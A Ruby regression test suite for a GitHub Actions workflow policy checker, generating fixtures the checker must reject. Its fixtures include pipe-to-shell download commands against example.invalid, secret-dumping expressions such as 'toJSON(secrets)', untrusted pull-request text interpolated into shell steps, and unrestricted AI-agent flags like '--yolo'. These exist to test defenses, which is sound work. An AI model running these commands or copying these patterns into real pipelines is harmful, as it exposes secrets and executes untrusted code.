#!/usr/bin/env ruby

require 'fileutils'
require 'open3'
require 'tmpdir'
require 'yaml'

checker = File.expand_path('check-workflow-policy.rb', __dir__)
safe_sha = '0123456789abcdef0123456789abcdef01234567'

def checkout_step(safe_sha)
  {
    'uses' => "actions/checkout@#{safe_sha}",
    'with' => { 'persist-credentials' => false }
  }
end

def standard_job(safe_sha, overrides = {})
  {
    'runs-on' => 'ubuntu-latest',
    'timeout-minutes' => 5,
    'permissions' => { 'contents' => 'read' },
    'steps' => [checkout_step(safe_sha), { 'run' => 'echo safe' }]
  }.merge(overrides)
end

def workflow_yaml(safe_sha, events: ['push'], permissions: { 'contents' => 'read' }, jobs: nil)
  workflow = {
    'name' => 'Policy fixture',
    'on' => events,
    'permissions' => permissions,
    'jobs' => jobs || { 'test' => standard_job(safe_sha) }
  }
  YAML.dump(workflow)
end

cases = {}
add_case = lambda do |name, content, should_pass, expected_error = nil|
  cases[name] = [content, should_pass, expected_error]
end

add_case.call('safe', workflow_yaml(safe_sha), true)
add_case.call(
  'codeql-security-events-write',
  workflow_yaml(
    safe_sha,
    events: {
      'push' => { 'branches' => ['staging'] },
      'schedule' => [{ 'cron' => '0 0 * * 1' }]
    },
    jobs: {
      'codeql' => standard_job(
        safe_sha,
        'permissions' => { 'contents' => 'read', 'security-events' => 'write' },
        'steps' => [
          checkout_step(safe_sha),
          { 'uses' => "github/codeql-action/init@#{safe_sha}", 'with' => { 'languages' => 'javascript-typescript' } },
          { 'uses' => "github/codeql-action/analyze@#{safe_sha}" }
        ]
      )
    }
  ),
  true
)

add_case.call('top-write-all', workflow_yaml(safe_sha, permissions: 'write-all'), false, 'top-level permissions: write-all is forbidden')
add_case.call('top-permissions-read-all', workflow_yaml(safe_sha, permissions: 'read-all'), false, 'top-level permissions: read-all is forbidden')
add_case.call('top-permissions-string', workflow_yaml(safe_sha, permissions: 'contents: read'), false, 'top-level permissions must be an explicit mapping')
add_case.call(
  'job-write-all',
  workflow_yaml(safe_sha, jobs: { 'unsafe' => standard_job(safe_sha, 'permissions' => 'write-all') }),
  false,
  'job unsafe permissions: write-all is forbidden'
)
add_case.call(
  'job-permissions-read-all',
  workflow_yaml(safe_sha, jobs: { 'unsafe' => standard_job(safe_sha, 'permissions' => 'read-all') }),
  false,
  'job unsafe permissions: read-all is forbidden'
)
add_case.call(
  'job-permissions-missing',
  workflow_yaml(safe_sha, jobs: { 'unsafe' => standard_job(safe_sha).tap { |job| job.delete('permissions') } }),
  false,
  'job unsafe permissions must be an explicit mapping'
)
add_case.call(
  'job-permissions-string',
  workflow_yaml(safe_sha, jobs: { 'unsafe' => standard_job(safe_sha, 'permissions' => 'contents: read') }),
  false,
  'job unsafe permissions must be an explicit mapping'
)
add_case.call(
  'push-write-all',
  workflow_yaml(safe_sha, permissions: 'write-all'),
  false,
  'write-all is forbidden'
)
add_case.call(
  'push-contents-write',
  workflow_yaml(safe_sha, jobs: { 'unsafe' => standard_job(safe_sha, 'permissions' => { 'contents' => 'write' }) }),
  false,
  'write permission contents: write is forbidden'
)
add_case.call(
  'id-token-write',
  workflow_yaml(safe_sha, jobs: { 'unsafe' => standard_job(safe_sha, 'permissions' => { 'id-token' => 'write' }) }),
  false,
  'write permission id-token: write is forbidden'
)
add_case.call(
  'codeql-write-on-workflow-dispatch',
  workflow_yaml(
    safe_sha,
    events: ['workflow_dispatch'],
    jobs: {
      'codeql' => standard_job(
        safe_sha,
        'permissions' => { 'security-events' => 'write' },
        'steps' => [{ 'uses' => "github/codeql-action/analyze@#{safe_sha}" }]
      )
    }
  ),
  false,
  'write permission security-events: write is forbidden'
)
add_case.call(
  'codeql-step-in-unapproved-job',
  workflow_yaml(
    safe_sha,
    jobs: {
      'ordinary-build' => standard_job(
        safe_sha,
        'permissions' => { 'security-events' => 'write' },
        'steps' => [{ 'uses' => "github/codeql-action/analyze@#{safe_sha}" }]
      )
    }
  ),
  false,
  'write permission security-events: write is forbidden'
)
add_case.call(
  'pr-job-write',
  workflow_yaml(safe_sha, events: ['pull_request'], jobs: { 'unsafe' => standard_job(safe_sha, 'permissions' => { 'issues' => 'write' }) }),
  false,
  'write permission issues: write is forbidden'
)

missing_permissions = YAML.safe_load(workflow_yaml(safe_sha), aliases: false)
missing_permissions.delete('permissions')
add_case.call('missing-top-permissions', YAML.dump(missing_permissions), false, 'top-level permissions must be declared')
add_case.call(
  'missing-timeout',
  workflow_yaml(safe_sha, jobs: { 'unsafe' => standard_job(safe_sha).tap { |job| job.delete('timeout-minutes') } }),
  false,
  'must declare timeout-minutes'
)
add_case.call(
  'timeout-zero',
  workflow_yaml(safe_sha, jobs: { 'unsafe' => standard_job(safe_sha, 'timeout-minutes' => 0) }),
  false,
  'timeout-minutes must be an integer from 1 to 60'
)
add_case.call(
  'timeout-over-limit',
  workflow_yaml(safe_sha, jobs: { 'unsafe' => standard_job(safe_sha, 'timeout-minutes' => 61) }),
  false,
  'timeout-minutes must be an integer from 1 to 60'
)
add_case.call(
  'timeout-expression',
  workflow_yaml(safe_sha, jobs: { 'unsafe' => standard_job(safe_sha, 'timeout-minutes' => '${{ matrix.timeout }}') }),
  false,
  'timeout-minutes must be an integer from 1 to 60'
)
add_case.call(
  'timeout-string',
  workflow_yaml(safe_sha, jobs: { 'unsafe' => standard_job(safe_sha, 'timeout-minutes' => '5') }),
  false,
  'timeout-minutes must be an integer from 1 to 60'
)
add_case.call('timeout-minimum', workflow_yaml(safe_sha, jobs: { 'safe' => standard_job(safe_sha, 'timeout-minutes' => 1) }), true)
add_case.call('timeout-maximum', workflow_yaml(safe_sha, jobs: { 'safe' => standard_job(safe_sha, 'timeout-minutes' => 60) }), true)
add_case.call(
  'missing-persist-credentials',
  workflow_yaml(safe_sha, jobs: { 'unsafe' => standard_job(safe_sha, 'steps' => [{ 'uses' => "actions/checkout@#{safe_sha}" }]) }),
  false,
  'must set persist-credentials: false'
)
add_case.call(
  'persist-credentials-true',
  workflow_yaml(
    safe_sha,
    jobs: {
      'unsafe' => standard_job(
        safe_sha,
        'steps' => [{ 'uses' => "actions/checkout@#{safe_sha}", 'with' => { 'persist-credentials' => true } }]
      )
    }
  ),
  false,
  'must set persist-credentials: false'
)
add_case.call('pull-request-target', workflow_yaml(safe_sha, events: ['pull_request_target']), false, 'pull_request_target is forbidden')
add_case.call(
  'floating-step-action',
  workflow_yaml(safe_sha, jobs: { 'unsafe' => standard_job(safe_sha, 'steps' => [{ 'uses' => 'actions/checkout@v5' }]) }),
  false,
  'action is not pinned'
)
add_case.call(
  'floating-job-action',
  workflow_yaml(
    safe_sha,
    jobs: { 'unsafe' => { 'uses' => 'actions/reusable-workflows/.github/workflows/reuse.yml@main', 'timeout-minutes' => 5 } }
  ),
  false,
  'reusable workflow is not pinned'
)
add_case.call(
  'docker-tag',
  workflow_yaml(safe_sha, jobs: { 'unsafe' => standard_job(safe_sha, 'steps' => [{ 'uses' => 'docker://alpine:3.20' }]) }),
  false,
  'action is not pinned'
)
add_case.call(
  'unapproved-pinned-docker-image',
  workflow_yaml(
    safe_sha,
    jobs: {
      'unsafe' => standard_job(
        safe_sha,
        'steps' => [{ 'uses' => "docker://unapproved.invalid/scanner@sha256:#{'a' * 64}" }]
      )
    }
  ),
  false,
  'docker image is not approved'
)
add_case.call(
  'unapproved-pinned-action',
  workflow_yaml(safe_sha, jobs: { 'unsafe' => standard_job(safe_sha, 'steps' => [{ 'uses' => "unapproved/action@#{safe_sha}" }]) }),
  false,
  'action repository is not approved'
)
add_case.call(
  'local-composite-action',
  workflow_yaml(safe_sha, jobs: { 'unsafe' => standard_job(safe_sha, 'steps' => [{ 'uses' => './.github/actions/composite' }]) }),
  false,
  'local actions and local reusable workflows are forbidden in policy v1'
)
add_case.call(
  'local-javascript-action',
  workflow_yaml(safe_sha, jobs: { 'unsafe' => standard_job(safe_sha, 'steps' => [{ 'uses' => './.github/actions/javascript' }]) }),
  false,
  'local actions and local reusable workflows are forbidden in policy v1'
)
add_case.call(
  'local-reusable-workflow',
  workflow_yaml(
    safe_sha,
    jobs: { 'unsafe' => { 'uses' => './.github/workflows/reusable.yml', 'timeout-minutes' => 5 } }
  ),
  false,
  'local actions and local reusable workflows are forbidden in policy v1'
)
add_case.call(
  'local-action-hides-floating-action',
  workflow_yaml(safe_sha, jobs: { 'unsafe' => standard_job(safe_sha, 'steps' => [{ 'uses' => './.github/actions/hides-floating-action' }]) }),
  false,
  'local actions and local reusable workflows are forbidden in policy v1'
)

add_case.call(
  'job-container-string',
  workflow_yaml(safe_sha, jobs: { 'unsafe' => standard_job(safe_sha, 'container' => 'unapproved.invalid/runner:latest') }),
  false,
  'containers are forbidden in policy v1'
)
add_case.call(
  'job-container-mapping',
  workflow_yaml(safe_sha, jobs: { 'unsafe' => standard_job(safe_sha, 'container' => { 'image' => 'unapproved.invalid/runner:latest' }) }),
  false,
  'containers are forbidden in policy v1'
)
add_case.call(
  'job-container-dynamic-expression',
  workflow_yaml(safe_sha, jobs: { 'unsafe' => standard_job(safe_sha, 'container' => '${{ matrix.container }}') }),
  false,
  'containers are forbidden in policy v1'
)
add_case.call(
  'job-service-string',
  workflow_yaml(safe_sha, jobs: { 'unsafe' => standard_job(safe_sha, 'services' => 'unapproved.invalid/service:latest') }),
  false,
  'services are forbidden in policy v1'
)
add_case.call(
  'job-service-mapping',
  workflow_yaml(
    safe_sha,
    jobs: { 'unsafe' => standard_job(safe_sha, 'services' => { 'database' => { 'image' => 'unapproved.invalid/database:latest' } }) }
  ),
  false,
  'services are forbidden in policy v1'
)
add_case.call(
  'job-service-dynamic-expression',
  workflow_yaml(
    safe_sha,
    jobs: { 'unsafe' => standard_job(safe_sha, 'services' => { 'database' => '${{ matrix.service }}' }) }
  ),
  false,
  'services are forbidden in policy v1'
)
add_case.call(
  'pinned-but-forbidden-job-container',
  workflow_yaml(
    safe_sha,
    jobs: { 'unsafe' => standard_job(safe_sha, 'container' => "approved.invalid/runner@sha256:#{'a' * 64}") }
  ),
  false,
  'containers are forbidden in policy v1'
)
add_case.call(
  'pinned-but-forbidden-service',
  workflow_yaml(
    safe_sha,
    jobs: {
      'unsafe' => standard_job(
        safe_sha,
        'services' => { 'database' => { 'image' => "approved.invalid/database@sha256:#{'b' * 64}" } }
      )
    }
  ),
  false,
  'services are forbidden in policy v1'
)

add_case.call(
  'dot-secret',
  workflow_yaml(safe_sha, events: ['pull_request'], jobs: { 'unsafe' => standard_job(safe_sha, 'env' => { 'KEY' => '${{ secrets.TEST_KEY }}' }) }),
  false,
  'must not reference secrets'
)
add_case.call(
  'bracket-secret',
  workflow_yaml(safe_sha, events: ['pull_request'], jobs: { 'unsafe' => standard_job(safe_sha, 'env' => { 'KEY' => "${{ secrets['KEY'] }}" }) }),
  false,
  'must not reference secrets'
)
add_case.call(
  'dynamic-secret',
  workflow_yaml(safe_sha, events: ['pull_request'], jobs: { 'unsafe' => standard_job(safe_sha, 'env' => { 'KEY' => '${{ secrets[matrix.key] }}' }) }),
  false,
  'must not reference secrets'
)
add_case.call(
  'all-secrets-json',
  workflow_yaml(safe_sha, events: ['pull_request'], jobs: { 'unsafe' => standard_job(safe_sha, 'env' => { 'KEYS' => '${{ toJSON(secrets) }}' }) }),
  false,
  'must not reference secrets'
)
add_case.call(
  'secrets-inherit',
  workflow_yaml(
    safe_sha,
    events: ['pull_request'],
    jobs: {
      'unsafe' => {
        'uses' => './.github/workflows/reusable.yml',
        'timeout-minutes' => 5,
        'secrets' => 'inherit'
      }
    }
  ),
  false,
  'must not use secrets: inherit'
)
add_case.call(
  'local-reusable-secrets-inherit',
  workflow_yaml(
    safe_sha,
    events: ['pull_request'],
    jobs: {
      'unsafe' => {
        'uses' => './.github/workflows/local-security.yml',
        'timeout-minutes' => 5,
        'secrets' => 'inherit'
      }
    }
  ),
  false,
  'must not use secrets: inherit'
)
add_case.call(
  'production-secret',
  workflow_yaml(safe_sha, events: ['pull_request'], jobs: { 'unsafe' => standard_job(safe_sha, 'env' => { 'KEY' => '${{ secrets.STRIPE_LIVE_KEY }}' }) }),
  false,
  'must not reference secrets'
)
add_case.call(
  'bare-secret-object',
  workflow_yaml(safe_sha, events: ['push'], jobs: { 'unsafe' => standard_job(safe_sha, 'env' => { 'KEYS' => '${{ secrets }}' }) }),
  false,
  'must not reference secrets'
)
add_case.call(
  'schedule-secret',
  workflow_yaml(
    safe_sha,
    events: { 'schedule' => [{ 'cron' => '0 0 * * 1' }] },
    jobs: { 'unsafe' => standard_job(safe_sha, 'env' => { 'KEY' => '${{ secrets.SCHEDULE_KEY }}' }) }
  ),
  false,
  'must not reference secrets'
)
add_case.call(
  'push-secret',
  workflow_yaml(safe_sha, events: ['push'], jobs: { 'unsafe' => standard_job(safe_sha, 'env' => { 'KEY' => '${{ secrets.PUSH_KEY }}' }) }),
  false,
  'must not reference secrets'
)
add_case.call(
  'workflow-dispatch-secret',
  workflow_yaml(safe_sha, events: ['workflow_dispatch'], jobs: { 'unsafe' => standard_job(safe_sha, 'env' => { 'KEY' => '${{ secrets.DISPATCH_KEY }}' }) }),
  false,
  'must not reference secrets'
)
add_case.call(
  'workflow-run-secret',
  workflow_yaml(
    safe_sha,
    events: { 'workflow_run' => { 'workflows' => ['CI'], 'types' => ['completed'] } },
    jobs: { 'unsafe' => standard_job(safe_sha, 'env' => { 'KEY' => '${{ secrets.WORKFLOW_RUN_KEY }}' }) }
  ),
  false,
  'must not reference secrets'
)
add_case.call(
  'issue-comment-secret',
  workflow_yaml(safe_sha, events: ['issue_comment'], jobs: { 'unsafe' => standard_job(safe_sha, 'env' => { 'KEY' => '${{ secrets.ISSUE_COMMENT_KEY }}' }) }),
  false,
  'must not reference secrets'
)
add_case.call(
  'workflow-call-secret',
  workflow_yaml(safe_sha, events: ['workflow_call'], jobs: { 'unsafe' => standard_job(safe_sha, 'env' => { 'KEY' => '${{ secrets.WORKFLOW_CALL_KEY }}' }) }),
  false,
  'must not reference secrets'
)
add_case.call(
  'workflow-call-secret-declaration',
  workflow_yaml(
    safe_sha,
    events: { 'workflow_call' => { 'secrets' => { 'CALLER_TOKEN' => { 'required' => true } } } }
  ),
  false,
  'must not declare or pass secrets'
)
add_case.call(
  'workflow-call-secrets-inherit',
  workflow_yaml(
    safe_sha,
    events: ['workflow_call'],
    jobs: {
      'unsafe' => {
        'uses' => './.github/workflows/local-security.yml',
        'timeout-minutes' => 5,
        'secrets' => 'inherit'
      }
    }
  ),
  false,
  'must not use secrets: inherit'
)
add_case.call(
  'local-reusable-workflow-environment-secret',
  workflow_yaml(
    safe_sha,
    events: ['push'],
    jobs: {
      'unsafe' => {
        'uses' => './.github/workflows/local-security.yml',
        'timeout-minutes' => 5,
        'secrets' => { 'environment_token' => '${{ secrets.STAGING_ENVIRONMENT_TOKEN }}' }
      }
    }
  ),
  false,
  'must not reference secrets'
)

add_case.call(
  'self-hosted-runner',
  workflow_yaml(safe_sha, events: ['pull_request'], jobs: { 'unsafe' => standard_job(safe_sha, 'runs-on' => ['self-hosted', 'linux']) }),
  false,
  'must use an approved GitHub-hosted runner'
)
add_case.call(
  'custom-runner-label',
  workflow_yaml(safe_sha, events: ['pull_request'], jobs: { 'unsafe' => standard_job(safe_sha, 'runs-on' => 'corp-linux') }),
  false,
  'must use an approved GitHub-hosted runner'
)
add_case.call(
  'dynamic-runner-expression',
  workflow_yaml(safe_sha, events: ['pull_request'], jobs: { 'unsafe' => standard_job(safe_sha, 'runs-on' => '${{ matrix.runner }}') }),
  false,
  'must use an approved GitHub-hosted runner'
)
add_case.call(
  'issue-comment-self-hosted-runner',
  workflow_yaml(safe_sha, events: ['issue_comment'], jobs: { 'unsafe' => standard_job(safe_sha, 'runs-on' => ['self-hosted', 'linux']) }),
  false,
  'must use an approved GitHub-hosted runner'
)
add_case.call(
  'workflow-run-self-hosted-runner',
  workflow_yaml(
    safe_sha,
    events: { 'workflow_run' => { 'workflows' => ['CI'], 'types' => ['completed'] } },
    jobs: { 'unsafe' => standard_job(safe_sha, 'runs-on' => 'self-hosted') }
  ),
  false,
  'must use an approved GitHub-hosted runner'
)
add_case.call(
  'schedule-self-hosted-runner',
  workflow_yaml(
    safe_sha,
    events: { 'schedule' => [{ 'cron' => '0 0 * * 1' }] },
    jobs: { 'unsafe' => standard_job(safe_sha, 'runs-on' => ['self-hosted', 'scheduled']) }
  ),
  false,
  'must use an approved GitHub-hosted runner'
)
add_case.call(
  'push-custom-runner',
  workflow_yaml(safe_sha, events: ['push'], jobs: { 'unsafe' => standard_job(safe_sha, 'runs-on' => 'corp-linux') }),
  false,
  'must use an approved GitHub-hosted runner'
)

add_case.call(
  'job-continue-on-error-true',
  workflow_yaml(safe_sha, jobs: { 'unsafe' => standard_job(safe_sha, 'continue-on-error' => true) }),
  false,
  'job unsafe continue-on-error must be explicitly false when present'
)
add_case.call(
  'job-continue-on-error-expression',
  workflow_yaml(safe_sha, jobs: { 'unsafe' => standard_job(safe_sha, 'continue-on-error' => '${{ matrix.allow_failure }}') }),
  false,
  'job unsafe continue-on-error must be explicitly false when present'
)
add_case.call(
  'job-continue-on-error-string',
  workflow_yaml(safe_sha, jobs: { 'unsafe' => standard_job(safe_sha, 'continue-on-error' => 'false') }),
  false,
  'job unsafe continue-on-error must be explicitly false when present'
)
add_case.call(
  'step-continue-on-error-true',
  workflow_yaml(safe_sha, jobs: { 'unsafe' => standard_job(safe_sha, 'steps' => [{ 'run' => 'exit 1', 'continue-on-error' => true }]) }),
  false,
  'step 1 in job unsafe continue-on-error must be explicitly false when present'
)
add_case.call(
  'step-continue-on-error-expression',
  workflow_yaml(
    safe_sha,
    jobs: { 'unsafe' => standard_job(safe_sha, 'steps' => [{ 'run' => 'exit 1', 'continue-on-error' => '${{ matrix.allow_failure }}' }]) }
  ),
  false,
  'step 1 in job unsafe continue-on-error must be explicitly false when present'
)
add_case.call(
  'step-continue-on-error-string',
  workflow_yaml(safe_sha, jobs: { 'unsafe' => standard_job(safe_sha, 'steps' => [{ 'run' => 'exit 1', 'continue-on-error' => 'false' }]) }),
  false,
  'step 1 in job unsafe continue-on-error must be explicitly false when present'
)
add_case.call(
  'job-continue-on-error-false',
  workflow_yaml(safe_sha, jobs: { 'safe' => standard_job(safe_sha, 'continue-on-error' => false) }),
  true
)
add_case.call(
  'step-continue-on-error-false',
  workflow_yaml(safe_sha, jobs: { 'safe' => standard_job(safe_sha, 'steps' => [{ 'run' => 'echo safe', 'continue-on-error' => false }]) }),
  true
)
{
  'untrusted-pr-title-in-run' => 'echo "${{ github.event.pull_request.title }}"',
  'untrusted-pr-body-in-run' => 'echo "${{ github.event.pull_request.body }}"',
  'untrusted-pr-head-ref-in-run' => 'echo "${{ github.event.pull_request.head.ref }}"',
  'untrusted-issue-title-in-run' => 'echo "${{ github.event.issue.title }}"',
  'untrusted-issue-body-in-run' => 'echo "${{ github.event.issue.body }}"',
  'untrusted-comment-body-in-run' => 'echo "${{ github.event.comment.body }}"',
  'untrusted-review-body-in-run' => 'echo "${{ github.event.review.body }}"',
  'untrusted-review-comment-body-in-run' => 'echo "${{ github.event.review_comment.body }}"',
  'untrusted-discussion-title-in-run' => 'echo "${{ github.event.discussion.title }}"',
  'untrusted-discussion-body-in-run' => 'echo "${{ github.event.discussion.body }}"',
  'untrusted-workflow-run-head-branch-in-run' => 'echo "${{ github.event.workflow_run.head_branch }}"',
  'untrusted-head-ref-in-run' => 'echo "${{ github.head_ref }}"',
  'untrusted-ref-name-in-run' => 'echo "${{ github.ref_name }}"',
  'untrusted-commit-message-in-run' => 'echo "${{ github.event.head_commit.message }}"'
}.each do |name, command|
  add_case.call(
    name,
    workflow_yaml(safe_sha, jobs: { 'unsafe' => standard_job(safe_sha, 'steps' => [{ 'run' => command }]) }),
    false,
    'directly interpolates untrusted GitHub context'
  )
end
add_case.call(
  'trusted-event-name-in-run',
  workflow_yaml(safe_sha, jobs: { 'safe' => standard_job(safe_sha, 'steps' => [{ 'run' => 'echo "${{ github.event_name }}"' }]) }),
  true
)
add_case.call(
  'trusted-sha-in-run',
  workflow_yaml(safe_sha, jobs: { 'safe' => standard_job(safe_sha, 'steps' => [{ 'run' => 'echo "${{ github.sha }}"' }]) }),
  true
)
add_case.call(
  'untrusted-pr-body-bracket-in-run',
  workflow_yaml(
    safe_sha,
    jobs: {
      'unsafe' => standard_job(
        safe_sha,
        'steps' => [{ 'run' => 'echo "${{ github[\'event\'][\'pull_request\'][\'body\'] }}"' }]
      )
    }
  ),
  false,
  'directly interpolates untrusted GitHub context'
)

add_case.call(
  'curl-pipe-bash',
  workflow_yaml(safe_sha, jobs: { 'unsafe' => standard_job(safe_sha, 'steps' => [{ 'run' => 'curl -fsSL https://example.invalid/install | bash' }]) }),
  false,
  'pipe-to-shell command is forbidden'
)
add_case.call(
  'wget-pipe-sh',
  workflow_yaml(safe_sha, jobs: { 'unsafe' => standard_job(safe_sha, 'steps' => [{ 'run' => 'wget -qO- https://example.invalid/install | sh' }]) }),
  false,
  'pipe-to-shell command is forbidden'
)
add_case.call(
  'curl-pipe-bin-bash',
  workflow_yaml(safe_sha, jobs: { 'unsafe' => standard_job(safe_sha, 'steps' => [{ 'run' => 'curl -fsSL https://example.invalid/install | /bin/bash' }]) }),
  false,
  'pipe-to-shell command is forbidden'
)
add_case.call(
  'wget-pipe-env-sh',
  workflow_yaml(safe_sha, jobs: { 'unsafe' => standard_job(safe_sha, 'steps' => [{ 'run' => 'wget -qO- https://example.invalid/install | env sh' }]) }),
  false,
  'pipe-to-shell command is forbidden'
)
add_case.call(
  'danger-full-access',
  workflow_yaml(safe_sha, jobs: { 'unsafe' => standard_job(safe_sha, 'steps' => [{ 'run' => 'codex --danger-full-access' }]) }),
  false,
  'unsafe runner flag'
)
add_case.call(
  'yolo',
  workflow_yaml(safe_sha, jobs: { 'unsafe' => standard_job(safe_sha, 'steps' => [{ 'run' => 'agent --yolo' }]) }),
  false,
  'unsafe runner flag'
)
add_case.call(
  'auto-merge',
  workflow_yaml(safe_sha, jobs: { 'unsafe' => standard_job(safe_sha, 'steps' => [{ 'run' => 'gh pr merge 1' }]) }),
  false,
  'auto-merge commands are forbidden'
)
add_case.call('yaml-alias', "name: alias\non: [push]\npermissions: &p\n  contents: read\njobs:\n  test:\n    permissions: *p\n", false, 'forbidden alias')
add_case.call('oversized-workflow', "# generated oversize fixture\n#{'x' * (513 * 1024)}", false, 'workflow exceeds')
add_case.call('malformed-yaml', "name: [broken\n", false, 'invalid YAML')

passing_cases = cases.count { |_name, (_content, should_pass, _error)| should_pass }

Dir.mktmpdir('graylum-workflow-policy-') do |root|
  cases.each do |name, (content, should_pass, expected_error)|
    directory = File.join(root, name)
    FileUtils.mkdir_p(directory)
    File.write(File.join(directory, 'workflow.yml'), content)
    _stdout, stderr, status = Open3.capture3('ruby', checker, directory)
    actual = status.success?
    next if actual == should_pass && (expected_error.nil? || stderr.include?(expected_error))

    warn "#{name}: expected pass=#{should_pass} and error=#{expected_error.inspect}, got pass=#{actual}: #{stderr}"
    exit 1
  end
end

puts "Workflow policy regression tests passed (#{cases.length} cases, #{cases.length - passing_cases} bypass attempts)."
